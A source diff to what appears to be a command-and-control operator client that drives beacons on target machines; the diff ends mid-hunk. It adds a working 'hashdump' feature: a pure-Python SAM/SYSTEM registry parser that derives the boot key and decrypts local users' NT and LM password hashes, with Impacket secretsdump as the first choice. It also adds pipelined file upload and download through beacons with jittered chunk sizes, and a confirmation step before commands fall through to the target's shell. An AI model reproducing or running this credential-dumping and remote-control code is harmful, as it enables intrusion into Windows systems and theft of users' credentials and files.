@@ -110,9 +110,9 @@ def _human_bytes(n: int) -> str:
 
 FALLBACK_META = [
     'help', 'beacons', 'bl', 'use', 'detach', 'info', 'caps',
-    'audit', 'chat', 'history', 'clear', 'exit', 'quit', 'build',
-    'c2-profiles', 'c2p', 'bofs', 'creds', 'notes', 'webhooks',
-    'operators', 'op', 'killall', 'recipes',
+    'audit', 'chat', 'history', 'jobs', 'clear', 'exit', 'quit',
+    'build', 'c2-profiles', 'c2p', 'bofs', 'creds', 'notes',
+    'webhooks', 'operators', 'op', 'killall', 'recipes',
     'deadman', 'halt', 'loot', 'lootstore',
 ]
 
@@ -578,6 +578,878 @@ def _pack_args_from_format(args, fmt):
     return bytes(out)
 
 
+# ---------------------------------------------------------------------
+# hashdump — secretsdump detection + native SAM/SYSTEM parser
+
+def _rc4(key: bytes, data: bytes) -> bytes:
+    """Standard RC4. KSA runs once with the full key; the PRGA state
+    is carried across the whole input buffer. That matches the
+    Windows SAM usage, where the same keystream encrypts the entire
+    block rather than being reset per segment."""
+    S = list(range(256))
+    j = 0
+    klen = len(key)
+    if klen == 0:
+        return data
+    for i in range(256):
+        j = (j + S[i] + key[i % klen]) & 0xFF
+        S[i], S[j] = S[j], S[i]
+    out = bytearray(len(data))
+    i = j = 0
+    for n, byte in enumerate(data):
+        i = (i + 1) & 0xFF
+        j = (j + S[i]) & 0xFF
+        S[i], S[j] = S[j], S[i]
+        out[n] = byte ^ S[(S[i] + S[j]) & 0xFF]
+    return bytes(out)
+
+
+def _find_secretsdump():
+    """Locate a secretsdump implementation.
+
+    Tries, in order:
+
+      * impacket-secretsdump   Kali/Debian/PyPI console script
+      * secretsdump.py         source checkout, legacy pip
+      * impacket_secretsdump   some distro packages
+      * secretsdump            occasional symlink
+
+    then falls back to invoking the module through the current
+    interpreter:
+
+      * python -m impacket.examples.secretsdump
+
+    Returns the argv prefix as a list, or None if nothing is
+    found. The returned list is meant to be extended with the
+    command-line arguments (-sam <path> -system <path> LOCAL)."""
+    for name in ('impacket-secretsdump', 'secretsdump.py',
+                 'impacket_secretsdump', 'secretsdump'):
+        path = shutil.which(name)
+        if path:
+            return [path]
+
+    # Try the module path through a few interpreters. The current
+    # one first, then the names most likely to be on PATH.
+    candidates = []
+    if sys.executable:
+        candidates.append(sys.executable)
+    candidates.extend(['python3', 'python'])
+
+    for py in candidates:
+        try:
+            proc = subprocess.run(
+                [py, '-c',
+                 'import impacket.examples.secretsdump'],
+                capture_output=True, timeout=15)
+        except (OSError, subprocess.TimeoutExpired,
+                FileNotFoundError):
+            continue
+        if proc.returncode == 0:
+            return [py, '-m', 'impacket.examples.secretsdump']
+    return None
+
+
+class _NativeSamParser:
+    """Pure-Python SAM + SYSTEM hive parser.
+
+    Reimplements the algorithms that Impacket's secretsdump.py
+    applies on the LOCAL path, so `hashdump` still produces
+    hashes when impacket is not installed on the operator's
+    machine. Supports Windows 7 through Windows 11 / Server
+    2022 (SAM revision 2 and 3).
+
+    Registry hive reference:
+      - Header: 4096 bytes, magic 'regf'.
+      - hbin blocks: 4096 bytes each, magic 'hbin'.
+      - Cells: 4-byte size prefix. Negative = allocated.
+      - Cell types: nk (key), vk (value), sk (security),
+        lf/lh/li/ri (subkey lists).
+
+    The decryption chain:
+      1. SYSTEM\\CurrentControlSet\\Control\\Lsa has four values
+         (JD, Skew1, GBG, Data). Concatenate their 4-byte hex-
+         decoded bodies and apply the well-known permutation to
+         get the 16-byte boot key.
+      2. SAM\\Domains\\Account\\F holds salt (offset 0x38, 16
+         bytes) and encrypted data (offset 0x48, 32 bytes). RC4
+         with MD5(class_name + DIGITS + salt + QWERTY) yields
+         the hashed boot key material.
+      3. Per-user V value carries LM and NT hash blobs at fixed
+         offsets. Each is decrypted with a per-RID key derived
+         from the hashed boot key, applied twice for
+         Win10+-style double-pass RC4."""
+
+    _PERMUTATION = [0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
+                    0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]
+    _QWERTY = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
+    _DIGITS = b"0123456789012345678901234567890123456789\x00"
+    _EMPTY_LM = bytes.fromhex('aad3b435b51404eeaad3b435b51404ee')
+    _EMPTY_NT = bytes.fromhex('31d6cfe0d16ae931b73c59d7e0c089c0')
+
+    # --- Hive parsing ------------------------------------------------
+
+    @staticmethod
+    def _parse_hive(blob: bytes) -> dict:
+        """Walk a hive blob and return a dict mapping lower-cased
+        key paths to (class_name_bytes, values_dict). Class name
+        and value names are decoded from their on-disk encodings.
+
+        values_dict maps a value name to (vtype, raw_bytes)."""
+        if len(blob) < 0x1000 or blob[:4] != b'regf':
+            raise ValueError('not a registry hive (bad magic)')
+
+        # Collect hbin blocks so we know the total addressable
+        # range and can validate cell offsets.
+        hbins = []
+        off = 0x1000
+        while off + 0x20 <= len(blob):
+            if blob[off:off + 4] != b'hbin':
+                break
+            size = struct.unpack_from('<I', blob, off + 0x08)[0]
+            if size < 0x20 or off + size > len(blob):
+                break
+            hbins.append((off, size))
+            off += size
+        if not hbins:
+            raise ValueError('no hbin blocks found')
+
+        first_hbin = hbins[0][0]
+
+        def cell(offset: int) -> bytes:
+            """Return the body of the cell at the given hive
+            offset, i.e. the bytes after the 4-byte size prefix.
+            `offset` is relative to the start of the first hbin
+            block, which is what every nk/vk pointer in a hive
+            uses."""
+            abs_off = first_hbin + offset
+            if abs_off + 4 > len(blob):
+                raise ValueError(
+                    f'cell offset {offset:#x} out of range')
+            size = struct.unpack_from('<i', blob, abs_off)[0]
+            if size < 0:
+                size = -size
+            if size < 4 or abs_off + size > len(blob):
+                raise ValueError(
+                    f'cell at {offset:#x} has bad size {size}')
+            return blob[abs_off + 4:abs_off + size]
+
+        def read_name(cdata: bytes) -> str:
+            name_len = struct.unpack_from('<H', cdata, 0x48)[0]
+            flags = struct.unpack_from('<H', cdata, 0x02)[0]
+            raw = cdata[0x4C:0x4C + (
+                name_len if (flags & 0x20) else name_len * 2)]
+            if flags & 0x20:
+                return raw.decode('latin-1', errors='replace')
+            return raw.decode('utf-16-le', errors='replace')
+
+        def subkey_offsets(cdata: bytes) -> list:
+            """Return the list of subkey cell offsets for a key
+            node, following lf/lh/li/ri indirection as needed."""
+            list_off = struct.unpack_from('<I', cdata, 0x1C)[0]
+            if list_off == 0xFFFFFFFF:
+                return []
+            try:
+                ldata = cell(list_off)
+            except ValueError:
+                return []
+            sig = ldata[:2]
+            if sig in (b'lf', b'lh'):
+                count = struct.unpack_from('<H', ldata, 2)[0]
+                return [
+                    struct.unpack_from(
+                        '<I', ldata, 4 + i * 8)[0]
+                    for i in range(count)
+                ]
+            if sig == b'li':
+                count = struct.unpack_from('<H', ldata, 2)[0]
+                return [
+                    struct.unpack_from(
+                        '<I', ldata, 4 + i * 4)[0]
+                    for i in range(count)
+                ]
+            if sig == b'ri':
+                count = struct.unpack_from('<H', ldata, 2)[0]
+                out = []
+                for i in range(count):
+                    sub_off = struct.unpack_from(
+                        '<I', ldata, 4 + i * 4)[0]
+                    try:
+                        sub = cell(sub_off)
+                    except ValueError:
+                        continue
+                    sub_sig = sub[:2]
+                    sub_count = struct.unpack_from(
+                        '<H', sub, 2)[0]
+                    if sub_sig in (b'lf', b'lh'):
+                        for j in range(sub_count):
+                            out.append(struct.unpack_from(
+                                '<I', sub,
+                                4 + j * 8)[0])
+                    elif sub_sig == b'li':
+                        for j in range(sub_count):
+                            out.append(struct.unpack_from(
+                                '<I', sub,
+                                4 + j * 4)[0])
+                return out
+            return []
+
+        def key_info(cdata: bytes):
+            """Return (class_name_bytes, values_dict)."""
+            class_len = struct.unpack_from('<H', cdata, 0x4A)[0]
+            class_off = struct.unpack_from('<I', cdata, 0x30)[0]
+            class_name = b''
+            if class_off != 0xFFFFFFFF and class_len:
+                try:
+                    class_name = cell(class_off)[:class_len]
+                except ValueError:
+                    class_name = b''
+
+            num_values = struct.unpack_from('<I', cdata, 0x24)[0]
+            values_off = struct.unpack_from('<I', cdata, 0x28)[0]
+            values = {}
+            if num_values and values_off != 0xFFFFFFFF:
+                try:
+                    vlist = cell(values_off)
+                except ValueError:
+                    return class_name, values
+                for i in range(num_values):
+                    if 4 + i * 4 + 4 > len(vlist):
+                        break
+                    v_off = struct.unpack_from(
+                        '<I', vlist, i * 4)[0]
+                    try:
+                        vcell = cell(v_off)
+                    except ValueError:
+                        continue
+                    if vcell[:2] != b'vk':
+                        continue
+                    name_len = struct.unpack_from(
+                        '<H', vcell, 0x02)[0]
+                    data_len = struct.unpack_from(
+                        '<I', vcell, 0x04)[0]
+                    data_off = struct.unpack_from(
+                        '<I', vcell, 0x08)[0]
+                    vtype = struct.unpack_from(
+                        '<I', vcell, 0x0C)[0]
+                    flags = struct.unpack_from(
+                        '<H', vcell, 0x10)[0]
+
+                    if name_len == 0:
+                        vname = '(default)'
+                    elif flags & 0x1:
+                        vname = vcell[0x14:0x14 + name_len] \
+                            .decode('latin-1', errors='replace')
+                    else:
+                        vname = vcell[0x14:0x14 + name_len * 2] \
+                            .decode('utf-16-le',
+                                    errors='replace')
+
+                    if data_len & 0x80000000:
+                        # Inline: data is packed into data_off.
+                        real_len = data_len & 0x7FFFFFFF
+                        raw = struct.pack(
+                            '<I', data_off)[:real_len]
+                    elif data_off == 0xFFFFFFFF or data_len == 0:
+                        raw = b''
+                    else:
+                        try:
+                            raw = cell(data_off)[:data_len]
+                        except ValueError:
+                            raw = b''
+                    values[vname] = (vtype, raw)
+            return class_name, values
+
+        root_off = struct.unpack_from('<I', blob, 0x24)[0]
+
+        tree = {}
+
+        def walk(offset: int, path: str):
+            try:
+                cdata = cell(offset)
+            except ValueError:
+                return
+            if cdata[:2] != b'nk':
+                return
+            name = read_name(cdata)
+            full = f"{path}\\{name}" if path else name
+            cls, vals = key_info(cdata)
+            tree[full.lower()] = (cls, vals)
+
+            for sub_off in subkey_offsets(cdata):
+                walk(sub_off, full)
+
+        walk(root_off, '')
+        return tree
+
+    @staticmethod
+    def _find(tree, *paths):
+        for p in paths:
+            hit = tree.get(p.lower())
+            if hit is not None:
+                return hit
+        return None
+
+    # --- Key derivation ----------------------------------------------
+
+    def __init__(self, sam_bytes: bytes, system_bytes: bytes):
+        self.sam = self._parse_hive(sam_bytes)
+        self.system = self._parse_hive(system_bytes)
+        self.boot_key = self._derive_boot_key()
+        self.hashed_boot_key = self._derive_hashed_boot_key()
+
+    def _derive_boot_key(self) -> bytes:
+        lsa = self._find(
+            self.system,
+            r'CurrentControlSet\Control\Lsa',
+            r'ControlSet001\Control\Lsa',
+        )
+        if lsa is None:
+            raise ValueError(
+                'SYSTEM: ControlSet\\Control\\Lsa not found')
+        _, vals = lsa
+        parts = []
+        for name in ('JD', 'Skew1', 'GBG', 'Data'):
+            hit = vals.get(name)
+            if hit is None:
+                raise ValueError(
+                    f'SYSTEM: LSA value {name!r} missing')
+            _t, raw = hit
+            text = raw.decode('utf-16-le',
+                              errors='replace').rstrip('\x00')
+            try:
+                parts.append(bytes.fromhex(text))
+            except ValueError as exc:
+                raise ValueError(
+                    f'SYSTEM: LSA value {name!r} is not hex '
+                    f'({text!r})') from exc
+        scrambled = b''.join(parts)
+        if len(scrambled) != 16:
+            raise ValueError(
+                f'SYSTEM: boot key material is '
+                f'{len(scrambled)} bytes, expected 16')
+        return bytes(scrambled[self._PERMUTATION[i]]
+                     for i in range(16))
+
+    def _derive_hashed_boot_key(self) -> bytes:
+        account = self._find(self.sam, r'SAM\Domains\Account')
+        if account is None:
+            raise ValueError(
+                'SAM: SAM\\Domains\\Account not found')
+        cls, vals = account
+        f_hit = vals.get('F')
+        if f_hit is None:
+            raise ValueError(
+                'SAM: SAM\\Domains\\Account has no F value')
+        _t, F = f_hit
+        if len(F) < 0x68:
+            raise ValueError(
+                f'SAM: F value is only {len(F)} bytes')
+        revision = F[0]
+        if revision not in (2, 3):
+            raise ValueError(
+                f'SAM: unsupported revision {revision} '
+                f'(Windows XP is not handled)')
+        salt = F[0x38:0x38 + 16]
+        data = F[0x48:0x48 + 32]
+
+        md5_in = cls + self._DIGITS + salt + self._QWERTY
+        sam_key = hashlib.md5(md5_in).digest()
+        return _rc4(sam_key, data)
+
+    # --- User enumeration + hash decryption --------------------------
+
+    def _decrypt_hash(self, rid: int, encrypted: bytes,
+                      constant: bytes) -> bytes:
+        rid_bytes = struct.pack('<I', rid)
+        key1 = hashlib.md5(
+            rid_bytes + constant +
+            self.hashed_boot_key[:16]).digest()
+        if len(self.hashed_boot_key) >= 32:
+            key2 = hashlib.md5(
+                rid_bytes + constant +
+                self.hashed_boot_key[16:32]).digest()
+        else:
+            key2 = key1
+        return _rc4(key2, _rc4(key1, encrypted))
+
+    def dump(self):
+        """Yield (rid, username, lm_hex, nt_hex) for every user
+        that has a V value carrying a hash blob."""
+        # RID → username, read from the Names subkey.
+        rid_to_name = {}
+        prefix = r'sam\domains\account\users\names\\'
+        for path, (_cls, vals) in self.sam.items():
+            if not path.startswith(prefix):
+                continue
+            uname = path[len(prefix):]
+            if '\\' in uname:
+                continue
+            dflt = vals.get('(default)')
+            if dflt is None:
+                continue
+            _t, blob = dflt
+            if len(blob) >= 4:
+                rid_to_name[struct.unpack(
+                    '<I', blob[-4:])[0]] = uname
+
+        user_prefix = r'sam\domains\account\users\\'
+        for path, (_cls, vals) in self.sam.items():
+            if not path.startswith(user_prefix):
+                continue
+            rid_part = path[len(user_prefix):]
+            if '\\' in rid_part:
+                continue
+            try:
+                rid = int(rid_part, 16)
+            except ValueError:
+                continue
+            v_hit = vals.get('V')
+            if v_hit is None:
+                continue
+            _t, V = v_hit
+            if len(V) < 0xCC:
+                continue
+            try:
+                nt_off = struct.unpack_from('<I', V, 0x9C)[0]
+                nt_len = struct.unpack_from('<I', V, 0xA0)[0]
+                lm_off = struct.unpack_from('<I', V, 0xA4)[0]
+                lm_len = struct.unpack_from('<I', V, 0xA8)[0]
+            except struct.error:
+                continue
+            nt_hex = ''
+            lm_hex = ''
+            if nt_len and 0 < nt_off + nt_len <= len(V):
+                try:
+                    dec = self._decrypt_hash(
+                        rid, V[nt_off:nt_off + nt_len],
+                        b'NTPASSWORD')
+                    nt_hex = dec[:16].hex()
+                except Exception:
+                    nt_hex = ''
+            if lm_len and 0 < lm_off + lm_len <= len(V):
+                try:
+                    dec = self._decrypt_hash(
+                        rid, V[lm_off:lm_off + lm_len],
+                        b'LMPASSWORD')
+                    lm_hex = dec[:16].hex()
+                except Exception:
+                    lm_hex = ''
+            uname = rid_to_name.get(rid, f'user{rid}')
+            yield rid, uname, lm_hex, nt_hex
+
+
+def _run_secretsdump(sam_path, sys_path):
+    """Try every secretsdump form. Returns a list of
+    {'user','domain','lm','ntlm'} dicts, or None if no
+    secretsdump was found. An empty list means it ran but
+    produced nothing usable."""
+    argv = _find_secretsdump()
+    if argv is None:
+        return None
+
+    try:
+        proc = subprocess.run(
+            argv + ['-sam', sam_path,
+                    '-system', sys_path, 'LOCAL'],
+            capture_output=True, text=True, timeout=180)
+    except subprocess.TimeoutExpired:
+        print(f"{CLR['red']}secretsdump timed out{CLR['reset']}")
+        return []
+    except OSError as exc:
+        print(f"{CLR['red']}secretsdump failed to start: "
+              f"{exc}{CLR['reset']}")
+        return []
+
+    if proc.returncode != 0:
+        print(f"{CLR['red']}secretsdump exited "
+              f"{proc.returncode}{CLR['reset']}")
+        for line in (proc.stderr or '').strip().splitlines():
+            print(f"  {CLR['red']}{line}{CLR['reset']}")
+        return []
+
+    empty_lm = 'aad3b435b51404eeaad3b435b51404ee'
+    empty_nt = '31d6cfe0d16ae931b73c59d7e0c089c0'
+
+    out = []
+    for line in proc.stdout.splitlines():
+        if not line.strip():
+            continue
+        if line.lstrip().startswith('[*]'):
+            continue
+
+        fields = line.split(':')
+        if len(fields) < 4:
+            continue
+
+        domain_user, _rid, lm, ntlm = fields[:4]
+
+        if '\\' in domain_user:
+            dom, who = domain_user.split('\\', 1)
+        else:
+            dom, who = '', domain_user
+
+        if not who or ' ' in who:
+            continue
+
+        print(f"  {line}")
+
+        has_nt = bool(ntlm) and ntlm != empty_nt
+        has_lm = bool(lm) and lm != empty_lm
+        if has_nt or has_lm:
+            out.append({'user': who, 'domain': dom,
+                        'lm': lm, 'ntlm': ntlm})
+
+    return out
+
+
+def _run_native_parser(sam_bytes, system_bytes):
+    """Parse the hives in pure Python. Returns a list of
+    {'user','domain','lm','ntlm'} dicts, or None on total
+    failure."""
+    try:
+        parser = _NativeSamParser(sam_bytes, system_bytes)
+    except Exception as exc:
+        print(f"  {CLR['red']}native parser: {exc}{CLR['reset']}")
+        return None
+
+    out = []
+    try:
+        for _rid, uname, lm_hex, nt_hex in parser.dump():
+            if nt_hex == \
+                    '31d6cfe0d16ae931b73c59d7e0c089c0' and \
+                    (not lm_hex or lm_hex ==
+                     'aad3b435b51404eeaad3b435b51404ee'):
+                continue
+            out.append({
+                'user': uname, 'domain': '',
+                'lm': lm_hex, 'ntlm': nt_hex})
+    except Exception as exc:
+        print(f"  {CLR['red']}native parser error: {exc}"
+              f"{CLR['reset']}")
+        if not out:
+            return None
+    return out
+
+
+# ---------------------------------------------------------------------
+# Background file transfers
+
+UPLOAD_CHUNK_SIZE    = 262144   # 256 KiB per chunk
+DOWNLOAD_CHUNK_SIZE  = 262144   # 256 KiB per chunk
+TRANSFER_QUEUE_DEPTH = 16       # chunks in flight at once
+TRANSFER_DRAIN_WAIT  = 0.5      # long-poll wait per drain attempt
+
+
+class _TransferJob:
+    """A background file transfer.
+
+    Runs in its own daemon thread. Pipelining keeps up to
+    TRANSFER_QUEUE_DEPTH chunks in the beacon's task queue at all
+    times, so the beacon is never idle waiting for the operator
+    side to enqueue the next chunk. The operator prompt is never
+    blocked: the job reports start, finish, and failure only —
+    per-chunk progress is available on demand through `jobs`.
+
+    Chunk size is 256 KiB rather than the historical 32 KiB. The
+    beacon's per-task overhead (queue entry, poll, signature
+    verify, result record) is the same regardless of payload, so
+    8x fewer tasks is roughly 8x fewer round trips on a sleep-0
+    beacon. Pipelining on top of that gives another large factor
+    on any beacon whose sleep interval is non-zero, because the
+    beacon drains its queue without waiting for us.
+    """
+
+    _counter = 0
+    _counter_lock = threading.Lock()
+
+    @classmethod
+    def _next_id(cls):
+        with cls._counter_lock:
+            cls._counter += 1
+            return f"t{cls._counter}"
+
+    def __init__(self, client, direction, local_path, remote_path,
+                 digest, size, beacon_id, no_loot=False):
+        self.id = cls_id = _TransferJob._next_id()
+        self.client = client
+        self.direction = direction          # 'upload' | 'download'
+        self.local_path = local_path
+        self.remote_path = remote_path
+        self.digest = digest                # local hash for upload,
+                                            # remote hash for download
+        self.size = size
+        self.beacon_id = beacon_id
+        self.no_loot = no_loot
+        self.started = time.time()
+        self.bytes_done = 0
+        self.chunks_done = 0
+        self.total_chunks = 0
+        self._stop = threading.Event()
+        self._thread = None
+
+    # --- public control -------------------------------------------
+
+    def start(self):
+        self._thread = threading.Thread(
+            target=self._run,
+            name=f"transfer-{self.id}-{self.direction}",
+            daemon=True)
+        self._thread.start()
+
+    def cancel(self):
+        self._stop.set()
+
+    def snapshot(self):
+        return {
+            'id':         self.id,
+            'direction':  self.direction,
+            'local':      self.local_path,
+            'remote':     self.remote_path,
+            'size':       self.size,
+            'done':       self.bytes_done,
+            'chunks':     self.chunks_done,
+            'total':      self.total_chunks,
+            'elapsed':    time.time() - self.started,
+        }
+
+    # --- worker ----------------------------------------------------
+
+    def _run(self):
+        try:
+            if self.direction == 'upload':
+                self._run_upload()
+            else:
+                self._run_download()
+            self.client._transfer_done(self, success=True)
+        except Exception as exc:
+            self.client._transfer_done(
+                self, success=False, error=str(exc))
+        finally:
+            self.client._transfers.pop(self.id, None)
+
+    # --- primitive helpers ----------------------------------------
+
+    def _enqueue(self, verb, args):
+        """Post one task. Returns task_id, or None if the
+        enqueue was refused (queue full, transport error)."""
+        try:
+            r = self.client.tp.post(
+                f'/api/v1/beacon/{self.beacon_id}/task',
+                {'verb': verb, 'args': args, 'timeout': 300},
+                timeout=30.0)
+        except Exception:
+            return None
+        return r.get('task_id')
+
+    def _wait_for(self, task_id, deadline):
+        """Block until a single task_id is ready, or the deadline
+        passes. Returns the response dict or None."""
+        while time.time() < deadline:
+            if self._stop.is_set():
+                return None
+            try:
+                r = self.client.tp.post(
+                    f'/api/v1/beacon/{self.beacon_id}'
+                    f'/result/{task_id}',
+                    {'wait': 1.0}, timeout=15.0)
+            except Exception:
+                time.sleep(0.2)
+                continue
+            if r.get('ready'):
+                return r
+        return None
+
+    def _drain_oldest(self, pending):
+        """Poll the oldest pending task once. Beacons return
+        results in FIFO order, so the oldest is the one most
+        likely to be ready. Returns (task_id, response) or None.
+
+        `pending` is a dict; Python 3.7+ preserves insertion
+        order, and we always insert in enqueue order."""
+        if not pending:
+            return None
+        tid = next(iter(pending))
+        try:
+            r = self.client.tp.post(
+                f'/api/v1/beacon/{self.beacon_id}'
+                f'/result/{tid}',
+                {'wait': TRANSFER_DRAIN_WAIT}, timeout=15.0)
+        except Exception:
+            time.sleep(0.2)
+            return None
+        if r.get('ready'):
+            return tid, r
+        return None
+
+    # --- upload ----------------------------------------------------
+
+    def _run_upload(self):
+        # Plan jittered chunk sizes up front so the sizes do not
+        # depend on how the pipeline drains.
+        low = max(4096, UPLOAD_CHUNK_SIZE // 2)
+        plan = []
+        remaining = self.size
+        while remaining > 0:
+            s = random.randint(low, UPLOAD_CHUNK_SIZE)
+            if s > remaining:
+                s = remaining
+            plan.append(s)
+            remaining -= s
+        self.total_chunks = len(plan)
+
+        # 1. Truncate the remote file.
+        tid = self._enqueue('truncate', [self.remote_path])
+        if not tid:
+            raise RuntimeError('could not enqueue truncate')
+        r = self._wait_for(tid, time.time() + 180)
+        if r is None:
+            raise RuntimeError('truncate timed out')
+        if r.get('error'):
+            raise RuntimeError(f'truncate: {r["error"]}')
+
+        # 2. Pipelined chunk write.
+        pending = {}          # task_id -> (idx, byte_len)
+        next_chunk = 0
+        with open(self.local_path, 'rb') as fh:
+            while (next_chunk < len(plan) or pending) \
+                    and not self._stop.is_set():
+                # Fill the pipeline.
+                while len(pending) < TRANSFER_QUEUE_DEPTH \
+                        and next_chunk < len(plan):
+                    want = plan[next_chunk]
+                    block = fh.read(want)
+                    if not block:
+                        break
+                    b64 = _b64.b64encode(block).decode('ascii')
+                    tid = self._enqueue(
+                        'writechunk', [b64, self.remote_path])
+                    if tid is None:
+                        # Queue full; back off and try again.
+                        break
+                    pending[tid] = (next_chunk, len(block))
+                    next_chunk += 1
+
+                ready = self._drain_oldest(pending)
+                if ready is None:
+                    if not pending and next_chunk >= len(plan):
+                        break
+                    continue
+                tid, r = ready
+                idx, blen = pending.pop(tid)
+                if r.get('error'):
+                    raise RuntimeError(
+                        f'chunk {idx}: {r["error"]}')
+                self.bytes_done += blen
+                self.chunks_done += 1
+
+        if self._stop.is_set():
+            raise RuntimeError('cancelled')
+
+        # 3. Verify remote SHA-256.
+        tid = self._enqueue('sha256file', [self.remote_path])
+        if not tid:
+            raise RuntimeError('could not enqueue sha256file')
+        r = self._wait_for(tid, time.time() + 180)
+        if r is None:
+            raise RuntimeError('verify timed out')
+        remote_hex = _b64.b64decode(
+            r.get('output') or '').decode(
+            'ascii', errors='replace').strip()
+        if remote_hex.lower() != self.digest.lower():
+            raise RuntimeError(
+                f'sha256 mismatch: local={self.digest[:16]}… '
+                f'remote={remote_hex[:16]}…')
+
+    # --- download --------------------------------------------------
+
+    def _run_download(self):
+        low = max(4096, DOWNLOAD_CHUNK_SIZE // 2)
+        plan = []
+        cursor = 0
+        while cursor < self.size:
+            s = random.randint(low, DOWNLOAD_CHUNK_SIZE)
+            if cursor + s > self.size:
+                s = self.size - cursor
+            plan.append((cursor, s))
+            cursor += s
+        self.total_chunks = len(plan)
+
+        # 1. Pipelined chunk read. Buffer results in memory,
+        #    write once at the end. Reordering happens naturally
+        #    because we key by chunk index, not by arrival order.
+        results = {}
+        pending = {}          # task_id -> (idx, offset, want)
+        next_chunk = 0
+        while (next_chunk < len(plan) or pending) \
+                and not self._stop.is_set():
+            while len(pending) < TRANSFER_QUEUE_DEPTH \
+                    and next_chunk < len(plan):
+                off, want = plan[next_chunk]
+                tid = self._enqueue(
+                    'readchunk',
+                    [self.remote_path, str(off), str(want)])
+                if tid is None:
+                    break
+                pending[tid] = (next_chunk, off, want)
+                next_chunk += 1
+
+            ready = self._drain_oldest(pending)
+            if ready is None:
+                if not pending and next_chunk >= len(plan):
+                    break
+                continue
+            tid, r = ready
+            idx, off, want = pending.pop(tid)
+            if r.get('error'):
+                raise RuntimeError(
+                    f'chunk {idx}: {r["error"]}')
+            data = _b64.b64decode(r.get('output') or '')
+            results[idx] = data
+            self.bytes_done += len(data)
+            self.chunks_done += 1
+
+        if self._stop.is_set():
+            raise RuntimeError('cancelled')
+
+        # 2. Write the file in chunk order.
+        try:
+            with open(self.local_path, 'wb') as fh:
+                for i in range(len(plan)):
+                    block = results.get(i)
+                    if block is None:
+                        raise RuntimeError(
+                            f'missing chunk {i} in local buffer')
+                    fh.write(block)
+        except OSError as exc:
+            raise RuntimeError(f'local write failed: {exc}')
+
+        # 3. Verify both sides.
+        h = hashlib.sha256()
+        with open(self.local_path, 'rb') as fh:
+            for block in iter(lambda: fh.read(1 << 20), b''):
+                h.update(block)
+        local_hex = h.hexdigest()
+
+        tid = self._enqueue('sha256file', [self.remote_path])
+        remote_hex = None
+        if tid:
+            r = self._wait_for(tid, time.time() + 180)
+            if r is not None:
+                remote_hex = _b64.b64decode(
+                    r.get('output') or '').decode(
+                    'ascii', errors='replace').strip()
+
+        if remote_hex and remote_hex.lower() != local_hex.lower():
+            raise RuntimeError(
+                f'sha256 mismatch: local={local_hex[:16]}… '
+                f'remote={remote_hex[:16]}…')
+
+        # Refresh digest to the verified local hash, so the
+        # completion line and the loot-store upload use the same
+        # value.
+        self.digest = local_hex
+
+
 class _RestartRequired(BaseException):
     """Raised inside a command handler to signal that the client
     should stop so the operator can restart it with a freshly
@@ -617,6 +1489,7 @@ class Client:
         self._client_ops_cache = None
         self._matches = []
         self._result_poller = None
+        self._transfers = {}
         self._no_interactive = False
         self._setup_readline()
 
@@ -880,6 +1753,7 @@ class Client:
         if arg_i == 0:
             candidates = set(self._verbs_for('main'))
             candidates.add('lootstore')
+            candidates.add('jobs')
             if self.current_beacon:
                 candidates |= self._verbs_for('beacon')
             return sorted(c for c in candidates
@@ -991,6 +1865,8 @@ class Client:
                     self._cmd_killall(parts)
                 elif cmd == 'history':
                     self._cmd_history(parts)
+                elif cmd == 'jobs':
+                    self._cmd_jobs(parts)
                 elif cmd == 'build':
                     self._cmd_build(parts)
                 elif cmd == 'recipes':
@@ -4816,6 +5692,8 @@ class Client:
             self._cmd_enablepriv(parts)
         elif op == 'migrate':
             self._cmd_migrate(parts)
+        elif op == 'shell':
+            self._cmd_shell(parts)
         elif verb == 'sh' and len(parts) > 1 \
                 and parts[1] == '--stdin':
             text = self._read_multiline()
@@ -4838,7 +5716,62 @@ class Client:
             self._cmd_cancel(parts)
             return
         else:
-            self._dispatch_task(['sh'] + parts)
+            if self._confirm_shell_fallthrough(parts):
+                self._dispatch_task(['sh'] + parts)
+            else:
+                print(f"{CLR['dim']}cancelled — nothing sent to "
+                      f"the target{CLR['reset']}")
+
+    def _confirm_shell_fallthrough(self, parts):
+        """Ask the operator before dispatching unrecognised input
+        to the beacon's shell.
+
+        Every line the client cannot resolve to a known verb falls
+        through to `sh <line>`, which means the target's shell
+        executes it with the operator's arguments. That is the
+        intended convenience for running an arbitrary shell command
+        without prefixing it with `sh` — but it also means a typo
+        (`lls` for `ls`, `whoam` for `whoami`, `ifconfg` for
+        `ifconfig`) reaches the target, fails there with a shell
+        error, and leaves a `beacon.use` audit entry that says the
+        operator typed something they did not mean.
+
+        The prompt names the exact line that will run on the
+        target, so a mis-typed verb is visible before it is sent.
+        The operator can prefix with `sh` to bypass the prompt when
+        the shell form is deliberate: `sh ipconfig /flushdns` runs
+        without asking, because the verb was already `sh` and the
+        fall-through never fires.
+
+        Returns True if the operator confirms, False otherwise.
+        Both `y` and `yes` are accepted, case-insensitive. Anything
+        else — including Enter on an empty line — is treated as a
+        decline. Ctrl-C and EOF are declines too: the outer loop
+        prints an `interrupted` line and the operator is back at
+        the prompt with nothing sent.
+
+        In the CLI the prompt is a multi-line string passed to
+        `input()`; the terminal renders each `\n` as a line break.
+        In the GUI, `input()` is intercepted by `_InputPrompt`,
+        which strips the ANSI codes and renders the message as a
+        wrapped label inside a modal dialog with Yes/No buttons.
+        Same call, both frontends."""
+        c = CLR
+        line = ' '.join(parts)
+        prompt = (
+            f"\n"
+            f"  {parts[0]!r} is not a recognised verb.\n"
+            f"  If you meant to run this as a shell command, "
+            f"the target will execute:\n"
+            f"    sh {line}\n"
+            f"  Send to the target? [y/N] "
+        )
+        try:
+            ans = input(prompt).strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            return False
+        return ans in ('y', 'yes')
 
     def _cmd_alias(self, parts):
         """alias [<name>] — set or clear this beacon's alias."""
@@ -5033,6 +5966,8 @@ class Client:
         elif sub == 'call' and len(parts) >= 3:
             self._dispatch_task(
                 ['extension_call', parts[2]] + parts[3:])
+        elif sub == 'info' and len(parts) >= 3:
+            self._dispatch_task(['extension_info', parts[2]])
         elif sub in ('info', 'unload', 'call'):
             print(f"{CLR['red']}usage: extension {sub} <name>"
                   f"{CLR['reset']}")
@@ -5180,50 +6115,46 @@ class Client:
         the chat renderer uses.
         """
         elapsed = time.time() - started
-        is_tty = _COLOR and sys.stdout.isatty()
-        if is_tty:
+
